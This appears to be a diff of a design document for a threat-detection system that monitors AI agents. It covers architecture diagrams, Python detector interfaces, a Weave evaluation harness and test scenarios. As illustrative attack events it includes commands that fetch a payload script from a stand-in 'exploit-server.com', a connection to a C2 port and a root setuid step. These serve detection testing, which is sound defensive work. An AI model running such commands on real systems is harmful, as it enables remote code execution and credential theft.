@@ -21,39 +21,39 @@ graph TB
         P4[Pillar 4: Pipeline Wrappers]
         P5[Pillar 5: Forensic Triage]
     end
-    
+
     subgraph Pillar 6: Advanced Threat Detection
         EventCollector[Event Stream Collector]
         AttackGraph[(Attack Graph Store)]
-        
+
         subgraph Real-Time Detection
             SwarmDetector[Agent Swarm Detector]
             AILMTracker[AILM Tracker]
             ExploitChainer[Exploit Chain Analyzer]
         end
-        
+
         subgraph Retrospective Analysis
             PathCorrelator[Multi-Stage Path Correlator]
             C2Detector[C2 Infrastructure Detector]
             TemporalAnalyzer[Temporal Pattern Matcher]
         end
     end
-    
+
     P1 -->|Syscall Events| EventCollector
     P2 -->|Threat Signatures| EventCollector
     P3 -->|Identity Events| EventCollector
     P4 -->|Pipeline Events| EventCollector
     P5 -->|Forensic Alerts| EventCollector
-    
+
     EventCollector --> AttackGraph
-    
+
     AttackGraph --> SwarmDetector
     AttackGraph --> AILMTracker
     AttackGraph --> ExploitChainer
     AttackGraph --> PathCorrelator
     AttackGraph --> C2Detector
     AttackGraph --> TemporalAnalyzer
-    
+
     SwarmDetector -->|Alert| AlertBus[Alert Bus]
     AILMTracker -->|Alert| AlertBus
     ExploitChainer -->|Alert| AlertBus
@@ -72,17 +72,17 @@ sequenceDiagram
     participant Graph as Attack Graph
     participant Alert as Alert System
 
-    
+
     Agent->>Kernel: execve("/bin/curl", "exploit-server.com")
     Kernel->>ATD: Event: SYSCALL_EXEC
     ATD->>Graph: Append to attack path
     Graph-->>ATD: Return current path context
-    
+
     Agent->>Kernel: socket.connect("192.0.2.1:4444")
     Kernel->>ATD: Event: NETWORK_CONNECT
     ATD->>Graph: Correlate with previous exec
     Graph-->>ATD: Match: Staged C2 pattern
-    
+
     ATD->>Alert: CRITICAL: Multi-stage C2 detected
 ```
 
@@ -97,28 +97,28 @@ flowchart LR
         S4[Pipeline Events]
         S5[Forensic Logs]
     end
-    
+
     subgraph Event Processing
         Normalizer[Event Normalizer]
         Enricher[Context Enricher]
     end
-    
+
     subgraph Storage
         GraphDB[(Attack Graph<br/>PostgreSQL)]
         TimeSeriesDB[(Time Series<br/>TimescaleDB)]
     end
 
-    
+
     subgraph Analysis Engines
         RealTime[Real-Time Detector]
         Retro[Retrospective Analyzer]
     end
-    
+
     S1 & S2 & S3 & S4 & S5 --> Normalizer
     Normalizer --> Enricher
     Enricher --> GraphDB
     Enricher --> TimeSeriesDB
-    
+
     GraphDB --> RealTime
     GraphDB & TimeSeriesDB --> Retro
 ```
@@ -159,19 +159,19 @@ class EventStreamCollector(Protocol):
     async def collect_from_kernel(self) -> AsyncIterator[NormalizedEvent]:
         """Stream events from Pillar 1: Kernel eBPF/Audit hooks"""
         ...
-    
+
     async def collect_from_tool_intercepts(self) -> AsyncIterator[NormalizedEvent]:
         """Stream events from ADK tool call interceptions"""
         ...
-    
+
     async def collect_from_identity(self) -> AsyncIterator[NormalizedEvent]:
         """Stream events from Pillar 3: Identity Sidecar"""
         ...
-    
+
     async def collect_from_pipeline(self) -> AsyncIterator[NormalizedEvent]:
         """Stream events from Pillar 4: Pipeline Wrappers"""
         ...
-    
+
     async def collect_from_forensics(self) -> AsyncIterator[NormalizedEvent]:
         """Stream events from Pillar 5: Forensic Triage Engine"""
         ...
@@ -214,16 +214,16 @@ class AttackGraphStore:
         """Insert event as node in attack graph"""
 
         ...
-    
+
     async def link_events(
-        self, 
-        from_node: str, 
-        to_node: str, 
+        self,
+        from_node: str,
+        to_node: str,
         relationship: str
     ) -> None:
         """Create directed edge between events"""
         ...
-    
+
     async def query_paths(
         self,
         agent_id: str,
@@ -232,7 +232,7 @@ class AttackGraphStore:
     ) -> List[AttackPath]:
         """Query multi-hop attack paths for agent within time window"""
         ...
-    
+
     async def find_correlated_agents(
         self,
         pattern: str,
@@ -269,7 +269,7 @@ class AgentSwarmDetector:
     async def fingerprint_agent(self, agent_id: str, window: int = 3600) -> str:
         """Generate behavioral fingerprint for agent over time window (seconds)"""
         ...
-    
+
     async def detect_swarms(
         self,
         time_window: tuple[datetime, datetime],
@@ -278,7 +278,7 @@ class AgentSwarmDetector:
     ) -> List[SwarmEvidence]:
         """Detect coordinated agent swarms"""
         ...
-    
+
     async def compute_coordination_score(
         self,
         agents: List[str],
@@ -322,7 +322,7 @@ class ExploitChainAnalyzer:
 
         """Classify event as potential exploit"""
         ...
-    
+
     async def detect_chains(
         self,
         agent_id: str,
@@ -330,7 +330,7 @@ class ExploitChainAnalyzer:
     ) -> List[ExploitChainEvidence]:
         """Detect exploit chains (e.g., RCE → Privilege Escalation → Credential Theft)"""
         ...
-    
+
     async def compute_novelty_score(self, chain: List[NormalizedEvent]) -> float:
         """Score chain novelty (0.0 = known pattern, 1.0 = novel)"""
         ...
@@ -368,7 +368,7 @@ class AILMTracker:
     async def track_permission_grant(self, grant: PermissionGrant) -> None:
         """Track permission grants at runtime"""
         ...
-    
+
     async def detect_permission_composition(
         self,
         agent_id: str,
@@ -376,7 +376,7 @@ class AILMTracker:
     ) -> List[AILMEvidence]:
         """Detect agents composing permissions across trust boundaries"""
         ...
-    
+
     async def identify_boundary_crossing(
         self,
         from_context: str,
@@ -414,11 +414,11 @@ class C2InfrastructureDetector:
     ) -> List[C2Evidence]:
         """Detect C2 infrastructure setup patterns"""
         ...
-    
+
     async def classify_endpoint(self, domain: str) -> Optional[str]:
         """Classify endpoint as potential C2 service (request.bin, pastebin, etc.)"""
         ...
-    
+
     async def detect_beaconing(
         self,
         agent_id: str,
@@ -458,7 +458,7 @@ class KubernetesDefenseLayer:
     ) -> List[K8sThreatEvidence]:
         """Detect unauthorized access to /var/run/secrets/kubernetes.io/serviceaccount/token"""
         ...
-    
+
     async def detect_fleet_spawning(
         self,
         time_window: tuple[datetime, datetime]
@@ -466,7 +466,7 @@ class KubernetesDefenseLayer:
         """Detect rapid pod creation across multiple nodes"""
 
         ...
-    
+
     async def detect_secrets_exfiltration(
         self,
         agent_id: str,
@@ -504,7 +504,7 @@ class PackageRegistryMonitor:
         """Stream registry access events"""
         ...
 
-    
+
     async def detect_exploit_probing(
         self,
         agent_id: str,
@@ -598,45 +598,45 @@ async def correlate_attack_paths(
 ) -> List[AttackPath]:
     """
     Correlate events into multi-stage attack paths using temporal graph traversal.
-    
+
     Preconditions:
     - agent_id is non-empty string
     - time_window[1] > time_window[0]
     - min_path_length >= 2
-    
+
     Postconditions:
     - Returns list of AttackPath objects
     - Each path contains at least min_path_length nodes
     - Paths are ordered by risk_score descending
     """
 
-    
+
     # Step 1: Query events for agent within time window
     events = await graph_store.query_events(
         agent_id=agent_id,
         start_time=time_window[0],
         end_time=time_window[1]
     )
-    
+
     if len(events) < min_path_length:
         return []
-    
+
     # Step 2: Build temporal adjacency graph
     adjacency_graph = {}
     for i, event in enumerate(events):
         adjacency_graph[event.event_id] = []
-        
+
         # Link to temporally adjacent events (within 5 minute window)
         for j in range(i + 1, len(events)):
             next_event = events[j]
             time_delta = (next_event.timestamp - event.timestamp).total_seconds()
-            
+
             if time_delta <= 300:  # 5 minutes
                 adjacency_graph[event.event_id].append({
                     'target': next_event.event_id,
                     'weight': compute_edge_weight(event, next_event)
                 })
-    
+
     # Step 3: Find all paths using depth-first search
     paths = []
     for start_node in adjacency_graph.keys():
@@ -647,7 +647,7 @@ async def correlate_attack_paths(
         )
 
         paths.extend(partial_paths)
-    
+
     # Step 4: Compute risk scores and filter
     scored_paths = []
     for path in paths:
@@ -663,10 +663,10 @@ async def correlate_attack_paths(
                 attack_stages=identify_mitre_stages(path),
                 correlation_score=compute_correlation_score(path)
             ))
-    
+
     # Step 5: Sort by risk score descending
     scored_paths.sort(key=lambda p: p.risk_score, reverse=True)
-    
+
     return scored_paths
 ```
 
@@ -1231,14 +1231,14 @@ graph TB
         EvalScenarios[Evaluation Scenarios]
         MetricsCollector[Metrics Collector]
     end
-    
+
     subgraph Weave Integration Layer
         WeaveInit[Weave Initialization]
         WeaveTracer[Weave Tracing]
         WeaveMetrics[Weave Metrics]
         WeaveDataset[Weave Dataset]
     end
-    
+
     subgraph ATD Components
         EventCollector[EventStreamCollector]
         AttackGraph[(Attack Graph Store)]
@@ -1246,27 +1246,27 @@ graph TB
         SwarmDetector[AgentSwarmDetector]
         AILMTracker[AILMTracker]
     end
-    
+
     EvalScenarios --> EvalRunner
     EvalRunner --> WeaveInit
     WeaveInit --> WeaveTracer
-    
+
     EvalRunner --> EventCollector
     EventCollector --> WeaveTracer
     EventCollector --> AttackGraph
-    
+
     AttackGraph --> PathCorrelator
     AttackGraph --> SwarmDetector
     AttackGraph --> AILMTracker
-    
+
     PathCorrelator --> WeaveTracer
     SwarmDetector --> WeaveTracer
     AILMTracker --> WeaveTracer
-    
+
     PathCorrelator --> MetricsCollector
     SwarmDetector --> MetricsCollector
     AILMTracker --> MetricsCollector
-    
+
     MetricsCollector --> WeaveMetrics
     EvalScenarios --> WeaveDataset
 ```
@@ -1296,7 +1296,7 @@ class WeaveEvaluationHarness:
     def __init__(self, config: WeaveConfig):
         """Initialize Weave with project configuration"""
         ...
-    
+
     @weave.op()
     async def run_evaluation(
         self,
@@ -1306,7 +1306,7 @@ class WeaveEvaluationHarness:
     ) -> Dict[str, Any]:
         """Execute evaluation scenario with Weave tracking"""
         ...
-    
+
     @weave.op()
     async def track_detection_metrics(
         self,
@@ -1318,7 +1318,7 @@ class WeaveEvaluationHarness:
         detection_latency_ms: float
     ) -> Dict[str, float]:
         """Compute and track precision, recall, F1, FPR.
-        
+
         FPR requires true_negatives: FPR = FP / (FP + TN).
         All four confusion-matrix counts must be supplied by the caller.
         """
@@ -1340,7 +1340,7 @@ class WeaveEvaluationHarness:
 class WeaveTracedPathCorrelator:
     def __init__(self, correlator: PathCorrelator):
         self.correlator = correlator
-    
+
     @weave.op()
     async def correlate_attack_paths(
         self,
@@ -1354,7 +1354,7 @@ class WeaveTracedPathCorrelator:
 class WeaveTracedSwarmDetector:
     def __init__(self, detector: AgentSwarmDetector):
         self.detector = detector
-    
+
     @weave.op()
     async def detect_swarms(
         self,
@@ -1368,7 +1368,7 @@ class WeaveTracedSwarmDetector:
 class WeaveTracedAILMTracker:
     def __init__(self, tracker: AILMTracker):
         self.tracker = tracker
-    
+
     @weave.op()
     async def detect_permission_composition(
         self,
@@ -1642,7 +1642,7 @@ class WeaveMetricsCollector:
     ) -> ThreatDetectionMetrics:
         """Compute standard classification metrics"""
         ...
-    
+
     @weave.op()
     def compute_path_correlation_metrics(
         self,
@@ -1652,7 +1652,7 @@ class WeaveMetricsCollector:
     ) -> Dict[str, float]:
         """Compute path correlation accuracy and latency"""
         ...
-    
+
     @weave.op()
     def compute_swarm_detection_metrics(
         self,
@@ -1662,7 +1662,7 @@ class WeaveMetricsCollector:
     ) -> Dict[str, float]:
         """Compute swarm detection accuracy"""
         ...
-    
+
     @weave.op()
     def export_metrics_to_weave(
         self,
@@ -1710,11 +1710,11 @@ weave:
   entity: null  # Defaults to user entity
   offline_mode: false
   parallelism: 10
-  
+
 evaluation:
   scenarios_dir: "tests/evals/scenarios/"
   metrics_export_interval_seconds: 60
-  
+
 detection_engines:
   path_correlator:
     trace_enabled: true
@@ -1750,7 +1750,7 @@ class WeaveTracedEventStreamCollector(EventStreamCollector):
         """Traced kernel event collection"""
         async for event in super().collect_from_kernel():
             yield event
-    
+
     @weave.op()
     async def collect_from_tool_intercepts(self) -> AsyncIterator[NormalizedEvent]:
         """Traced tool intercept collection"""
@@ -1766,7 +1766,7 @@ class WeaveTracedAttackGraphStore(AttackGraphStore):
     async def insert_event(self, event: NormalizedEvent) -> AttackNode:
         """Traced event insertion"""
         return await super().insert_event(event)
-    
+
     @weave.op()
     async def query_paths(
         self,
@@ -1845,7 +1845,7 @@ events:
     action: "execve"
     target: "/bin/bash -c 'curl exploit-server.com/payload.sh'"
     risk_score: 0.85
-  
+
   - event_id: "evt-002"
     timestamp: "2026-01-15T10:00:15Z"
     source: "KERNEL_SYSCALL"
@@ -1853,7 +1853,7 @@ events:
     action: "setuid"
     target: "0"
     risk_score: 0.95
-  
+
   - event_id: "evt-003"
     timestamp: "2026-01-15T10:00:30Z"
     source: "IDENTITY_ACCESS"
@@ -1868,12 +1868,12 @@ expected_detections:
     min_nodes: 3
     attack_stages: ["T1059.004", "T1068", "T1003.008"]
     min_risk_score: 0.85
-  
+
   exploit_chain:
     detected: true
     chain_sequence: ["RCE", "PRIVILEGE_ESCALATION", "CREDENTIAL_THEFT"]
     min_novelty_score: 0.0
-  
+
   ailm:
     detected: true
     boundary_crossings: ["user", "root"]
@@ -2043,13 +2043,13 @@ def weave_harness():
 async def test_eval_multi_stage_attack_detection(weave_harness):
     """Evaluate multi-stage attack path detection with Weave tracking"""
     scenario = load_scenario("multi_stage_attack.yaml")
-    
+
     result = await weave_harness.run_evaluation(
         scenario_name="multi_stage_attack",
         events=scenario["events"],
         expected_detections=scenario["expected_detections"]
     )
-    
+
     assert result["attack_path"]["detected"] == True
     assert result["metrics"]["precision"] >= 0.95
     assert result["metrics"]["recall"] >= 0.90
@@ -2059,13 +2059,13 @@ async def test_eval_multi_stage_attack_detection(weave_harness):
 async def test_eval_agent_swarm_detection(weave_harness):
     """Evaluate agent swarm detection with Weave tracking"""
     scenario = load_scenario("agent_swarm.yaml")
-    
+
     result = await weave_harness.run_evaluation(
         scenario_name="agent_swarm",
         events=scenario["events"],
         expected_detections=scenario["expected_detections"]
     )
-    
+
     assert result["swarm"]["detected"] == True
     assert result["metrics"]["false_positive_rate"] <= 0.05
 ```
@@ -2109,7 +2109,7 @@ def should_enable_weave() -> bool:
 # of the detector-suite pattern (e.g. WeaveEvaluationHarness methods).
 def weave_op_if_enabled(func):
     """Apply @weave.op() only if Weave is enabled.
-    
+
     NOTE: For detector components, prefer build_detector_suite() /
     the detector_suite fixture rather than this decorator directly,
     so that pytest marker state is also checked.
